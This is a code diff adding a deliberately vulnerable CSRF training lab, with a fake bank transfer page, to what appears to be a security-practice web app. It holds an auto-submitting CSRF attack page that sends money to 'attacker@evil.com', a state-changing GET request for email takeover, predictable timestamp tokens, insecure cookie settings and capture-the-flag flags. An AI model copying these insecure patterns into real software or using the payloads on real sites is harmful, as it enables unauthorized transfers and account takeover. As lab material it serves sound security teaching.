@@ -356,9 +356,455 @@ export async function registerIntermediateRoutes(app: Express): Promise<Server> 
     return res.json({ success: false, error: 'Token processing failed' });
   });
 
-  // 5. Advanced CSRF Lab
+  // 5. Advanced CSRF Lab with SameSite Bypass
+  const csrfSessions = new Map();
+  
   apiRouter.get('/vuln/csrf-advanced', (req: Request, res: Response) => {
-    return res.send('<h1>Advanced CSRF Lab - Intermediate (Coming Soon)</h1>');
+    const sessionId = req.cookies?.csrf_session || `user_${Date.now()}`;
+    
+    // Set SameSite=None cookie (vulnerable to CSRF)
+    res.cookie('csrf_session', sessionId, { 
+      sameSite: 'none',
+      secure: false, // In production, this should be true with HTTPS
+      httpOnly: false
+    });
+    
+    // Initialize session if doesn't exist
+    if (!csrfSessions.has(sessionId)) {
+      csrfSessions.set(sessionId, {
+        balance: 10000,
+        email: 'user@bank.com',
+        transactions: []
+      });
+    }
+    
+    const userData = csrfSessions.get(sessionId);
+    
+    return res.send(`
+      <!DOCTYPE html>
+      <html>
+      <head>
+        <title>Advanced CSRF Lab - SameSite Bypass</title>
+        <style>
+          * { margin: 0; padding: 0; box-sizing: border-box; }
+          body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            color: #e2e8f0;
+            padding: 20px;
+            min-height: 100vh;
+          }
+          .container { max-width: 1200px; margin: 0 auto; }
+          h1 { color: #ec4899; margin-bottom: 10px; font-size: 28px; }
+          .subtitle { color: #94a3b8; margin-bottom: 30px; font-size: 14px; }
+          .info-box {
+            background: #1e293b;
+            border: 1px solid #334155;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+          }
+          .info-box h3 { color: #ec4899; margin-bottom: 15px; font-size: 18px; }
+          .info-box ul { margin-left: 20px; line-height: 1.8; color: #cbd5e1; }
+          .info-box code { 
+            background: #0f172a; 
+            padding: 2px 8px; 
+            border-radius: 4px; 
+            color: #fbbf24;
+            font-family: 'Courier New', monospace;
+          }
+          .grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin-bottom: 20px;
+          }
+          .card {
+            background: #1e293b;
+            border: 1px solid #334155;
+            border-radius: 8px;
+            padding: 25px;
+          }
+          .card h3 { 
+            color: #ec4899; 
+            margin-bottom: 20px; 
+            padding-bottom: 15px; 
+            border-bottom: 1px solid #334155;
+          }
+          .balance {
+            font-size: 36px;
+            font-weight: bold;
+            color: #10b981;
+            margin: 20px 0;
+          }
+          .form-group {
+            margin-bottom: 20px;
+          }
+          .form-group label {
+            display: block;
+            color: #cbd5e1;
+            margin-bottom: 8px;
+            font-weight: 500;
+          }
+          .form-group input {
+            width: 100%;
+            padding: 12px;
+            background: #0f172a;
+            border: 1px solid #334155;
+            border-radius: 6px;
+            color: #e2e8f0;
+            font-family: inherit;
+          }
+          button {
+            padding: 12px 24px;
+            background: #ec4899;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: background 0.2s;
+            width: 100%;
+          }
+          button:hover { background: #db2777; }
+          .transaction-list {
+            background: #0f172a;
+            padding: 15px;
+            border-radius: 6px;
+            margin-top: 20px;
+            max-height: 300px;
+            overflow-y: auto;
+          }
+          .transaction {
+            padding: 10px;
+            border-bottom: 1px solid #1e293b;
+            margin-bottom: 8px;
+          }
+          .transaction:last-child { border-bottom: none; }
+          .success { color: #10b981; }
+          .error { color: #ef4444; }
+          .warning { color: #fbbf24; }
+          .token-box {
+            background: #0f172a;
+            padding: 15px;
+            border-radius: 6px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            margin: 15px 0;
+            word-break: break-all;
+          }
+          .exploit-box {
+            background: #450a0a;
+            border: 1px solid #7f1d1d;
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 20px;
+          }
+          .exploit-box h4 { color: #ef4444; margin-bottom: 15px; }
+          .exploit-box code {
+            display: block;
+            background: #0f172a;
+            padding: 15px;
+            border-radius: 6px;
+            color: #fbbf24;
+            overflow-x: auto;
+            white-space: pre;
+            margin: 10px 0;
+          }
+          
+          @media (max-width: 768px) {
+            .grid { grid-template-columns: 1fr; }
+          }
+        </style>
+      </head>
+      <body>
+        <div class="container">
+          <h1>🔐 Advanced CSRF Lab - SameSite Bypass</h1>
+          <p class="subtitle">Intermediate Level - Cross-Site Request Forgery Exploitation</p>
+          
+          <div class="info-box">
+            <h3>🎯 Lab Objectives</h3>
+            <ul>
+              <li>Bypass SameSite=None cookie protections</li>
+              <li>Exploit weak CSRF token implementations</li>
+              <li>Perform unauthorized money transfers via CSRF</li>
+              <li>Chain multiple vulnerabilities for account takeover</li>
+              <li>Understand Top-Level Navigation attacks</li>
+            </ul>
+          </div>
+
+          <div class="info-box">
+            <h3>⚠️ Vulnerabilities Present</h3>
+            <ul>
+              <li><strong>SameSite=None:</strong> Cookie can be sent in cross-site requests</li>
+              <li><strong>Weak CSRF Token:</strong> Token uses predictable pattern (timestamp-based)</li>
+              <li><strong>No Referrer Check:</strong> Server doesn't validate request origin</li>
+              <li><strong>GET-based State Change:</strong> Some actions accept GET requests</li>
+              <li><strong>Credential Inclusion:</strong> Cookies automatically included in requests</li>
+            </ul>
+          </div>
+
+          <div class="grid">
+            <div class="card">
+              <h3>💰 Your Bank Account</h3>
+              <div style="color: #94a3b8; margin-bottom: 10px;">
+                Email: <strong style="color: #e2e8f0;">${userData.email}</strong>
+              </div>
+              <div class="balance">$${userData.balance.toLocaleString()}</div>
+              
+              <form id="transferForm">
+                <div class="form-group">
+                  <label>Transfer To:</label>
+                  <input type="text" name="recipient" placeholder="recipient@email.com" required>
+                </div>
+                <div class="form-group">
+                  <label>Amount ($):</label>
+                  <input type="number" name="amount" placeholder="100" required>
+                </div>
+                <div class="form-group">
+                  <label>CSRF Token:</label>
+                  <input type="text" name="csrf_token" id="csrfToken" readonly>
+                  <small style="color: #64748b;">Token auto-generated (timestamp-based)</small>
+                </div>
+                <button type="submit">Transfer Money</button>
+              </form>
+
+              <div class="transaction-list">
+                <h4 style="color: #ec4899; margin-bottom: 10px;">Recent Transactions</h4>
+                <div id="transactions">
+                  ${userData.transactions.length === 0 ? '<div style="color: #64748b;">No transactions yet</div>' : userData.transactions.map(t => 
+                    `<div class="transaction">
+                      <div class="error">-$${t.amount} to ${t.recipient}</div>
+                      <div style="font-size: 11px; color: #64748b;">${t.timestamp}</div>
+                    </div>`
+                  ).join('')}
+                </div>
+              </div>
+            </div>
+
+            <div class="card">
+              <h3>🔍 CSRF Analysis</h3>
+              
+              <div style="margin-bottom: 20px;">
+                <h4 style="color: #fbbf24; margin-bottom: 10px;">Current Session Cookie:</h4>
+                <div class="token-box">
+                  Session ID: ${sessionId}<br>
+                  SameSite: None<br>
+                  Secure: false<br>
+                  HttpOnly: false
+                </div>
+                <p style="color: #ef4444; font-size: 13px;">⚠️ This cookie will be sent with cross-origin requests!</p>
+              </div>
+
+              <div style="margin-bottom: 20px;">
+                <h4 style="color: #fbbf24; margin-bottom: 10px;">CSRF Token Pattern:</h4>
+                <div class="token-box" id="tokenPattern">Analyzing...</div>
+                <p style="color: #ef4444; font-size: 13px;">⚠️ Token uses predictable timestamp!</p>
+              </div>
+
+              <div style="margin-bottom: 20px;">
+                <h4 style="color: #10b981; margin-bottom: 10px;">Quick Test:</h4>
+                <button onclick="testEmailChange()" style="background: #10b981; margin-bottom: 10px;">Change Email (GET Request)</button>
+                <div id="quickTestResult" style="margin-top: 10px;"></div>
+              </div>
+            </div>
+          </div>
+
+          <div class="info-box">
+            <h3>🔧 Exploitation Techniques</h3>
+            <ul>
+              <li><strong>Burp Suite:</strong> Capture transfer request and analyze CSRF token generation</li>
+              <li><strong>Token Prediction:</strong> The CSRF token is: <code>csrf_${Math.floor(Date.now() / 1000)}</code></li>
+              <li><strong>SameSite Bypass:</strong> Create malicious HTML on external site to trigger transfers</li>
+              <li><strong>Top-Level Navigation:</strong> Use <code>window.open()</code> or <code>&lt;a&gt;</code> tag for GET-based attacks</li>
+              <li><strong>Form Auto-Submit:</strong> Create invisible form that auto-submits on page load</li>
+            </ul>
+          </div>
+
+          <div class="exploit-box">
+            <h4>💀 Exploitation Payload (Host on Attacker Site)</h4>
+            <code>&lt;!-- Malicious CSRF Attack Page --&gt;
+&lt;html&gt;
+&lt;body&gt;
+  &lt;h1&gt;Click here to claim your prize!&lt;/h1&gt;
+  &lt;form id="csrf" action="http://localhost:5000/api/vuln/csrf-advanced/transfer" method="POST"&gt;
+    &lt;input type="hidden" name="recipient" value="attacker@evil.com"&gt;
+    &lt;input type="hidden" name="amount" value="5000"&gt;
+    &lt;input type="hidden" name="csrf_token" value="csrf_${Math.floor(Date.now() / 1000)}"&gt;
+  &lt;/form&gt;
+  &lt;script&gt;
+    // Auto-submit when victim visits page
+    document.getElementById('csrf').submit();
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code>
+            <p style="margin-top: 15px; color: #fbbf24;">
+              <strong>Attack Vector:</strong> Send this link to victim. When they click it while logged into the bank, 
+              their cookies (with SameSite=None) will be included, and the transfer will execute!
+            </p>
+          </div>
+
+          <div class="info-box" style="margin-top: 20px;">
+            <h3>💡 Try These Attacks</h3>
+            <ul>
+              <li>Copy the exploit payload and host it on a different origin (replit.com or localhost:8000)</li>
+              <li>Use Burp Suite to intercept and modify CSRF tokens</li>
+              <li>Try the GET-based email change attack: <code>/api/vuln/csrf-advanced/change-email?email=attacker@evil.com</code></li>
+              <li>Predict future CSRF tokens using the timestamp pattern</li>
+              <li>Chain this with XSS to extract tokens programmatically</li>
+            </ul>
+          </div>
+        </div>
+
+        <script>
+          // Generate CSRF token (weak implementation - timestamp-based)
+          function generateCSRFToken() {
+            const timestamp = Math.floor(Date.now() / 1000);
+            return 'csrf_' + timestamp;
+          }
+
+          // Update token display
+          function updateToken() {
+            const token = generateCSRFToken();
+            document.getElementById('csrfToken').value = token;
+            
+            const pattern = document.getElementById('tokenPattern');
+            if (pattern) {
+              pattern.innerHTML = 'Current: <span class="warning">' + token + '</span><br>' +
+                                  'Next (1s): csrf_' + (Math.floor(Date.now() / 1000) + 1) + '<br>' +
+                                  'Pattern: csrf_[UNIX_TIMESTAMP]';
+            }
+          }
+          
+          updateToken();
+          setInterval(updateToken, 1000);
+
+          // Handle transfer form
+          document.getElementById('transferForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const formData = new FormData(e.target);
+            
+            const response = await fetch('/api/vuln/csrf-advanced/transfer', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              credentials: 'include',
+              body: JSON.stringify({
+                recipient: formData.get('recipient'),
+                amount: formData.get('amount'),
+                csrf_token: formData.get('csrf_token')
+              })
+            });
+            
+            const result = await response.json();
+            
+            if (result.success) {
+              alert('Transfer successful! Flag: ' + (result.flag || 'Keep exploiting!'));
+              location.reload();
+            } else {
+              alert('Transfer failed: ' + result.message);
+            }
+          });
+
+          // Quick GET-based email change test
+          async function testEmailChange() {
+            const result = document.getElementById('quickTestResult');
+            const newEmail = prompt('Enter new email address:', 'hacker@evil.com');
+            if (!newEmail) return;
+            
+            // Vulnerable GET request that changes state
+            const response = await fetch('/api/vuln/csrf-advanced/change-email?email=' + encodeURIComponent(newEmail), {
+              credentials: 'include'
+            });
+            
+            const data = await response.json();
+            
+            if (data.success) {
+              result.innerHTML = '<div class="success">✓ Email changed to: ' + data.email + '</div>' +
+                                 (data.flag ? '<div class="success">🎉 FLAG: ' + data.flag + '</div>' : '');
+            } else {
+              result.innerHTML = '<div class="error">✗ ' + data.message + '</div>';
+            }
+          }
+        </script>
+      </body>
+      </html>
+    `);
+  });
+
+  // Transfer endpoint (vulnerable to CSRF)
+  apiRouter.post('/vuln/csrf-advanced/transfer', express.json(), (req: Request, res: Response) => {
+    const sessionId = req.cookies?.csrf_session;
+    if (!sessionId || !csrfSessions.has(sessionId)) {
+      return res.json({ success: false, message: 'Invalid session' });
+    }
+
+    const { recipient, amount, csrf_token } = req.body;
+    
+    // Weak CSRF token validation (timestamp-based, easy to predict)
+    const expectedToken = 'csrf_' + Math.floor(Date.now() / 1000);
+    const prevToken = 'csrf_' + (Math.floor(Date.now() / 1000) - 1);
+    const nextToken = 'csrf_' + (Math.floor(Date.now() / 1000) + 1);
+    
+    if (csrf_token !== expectedToken && csrf_token !== prevToken && csrf_token !== nextToken) {
+      return res.json({ success: false, message: 'Invalid CSRF token' });
+    }
+
+    const userData = csrfSessions.get(sessionId);
+    const transferAmount = parseInt(amount);
+    
+    if (transferAmount > userData.balance) {
+      return res.json({ success: false, message: 'Insufficient balance' });
+    }
+
+    userData.balance -= transferAmount;
+    userData.transactions.push({
+      recipient,
+      amount: transferAmount,
+      timestamp: new Date().toLocaleString()
+    });
+
+    csrfSessions.set(sessionId, userData);
+    
+    // Reward flag for successful CSRF attack
+    const flag = recipient.includes('attacker') || recipient.includes('evil') || recipient.includes('hacker')
+      ? '{CSRF_SAMESITE_BYPASS_SUCCESSFUL}'
+      : null;
+
+    return res.json({ 
+      success: true, 
+      message: 'Transfer completed',
+      balance: userData.balance,
+      flag
+    });
+  });
+
+  // Vulnerable GET-based state change (classic CSRF)
+  apiRouter.get('/vuln/csrf-advanced/change-email', (req: Request, res: Response) => {
+    const sessionId = req.cookies?.csrf_session;
+    if (!sessionId || !csrfSessions.has(sessionId)) {
+      return res.json({ success: false, message: 'Invalid session' });
+    }
+
+    const { email } = req.query;
+    if (!email) {
+      return res.json({ success: false, message: 'Email required' });
+    }
+
+    const userData = csrfSessions.get(sessionId);
+    userData.email = email.toString();
+    csrfSessions.set(sessionId, userData);
+
+    // Reward flag for GET-based CSRF
+    const flag = email.toString().includes('attacker') || email.toString().includes('evil') || email.toString().includes('hacker')
+      ? '{CSRF_GET_BASED_ACCOUNT_TAKEOVER}'
+      : null;
+
+    return res.json({ 
+      success: true, 
+      email: email.toString(),
+      message: 'Email updated successfully',
+      flag
+    });
   });
 
   // 6. WebSocket Message Manipulation (Intermediate)
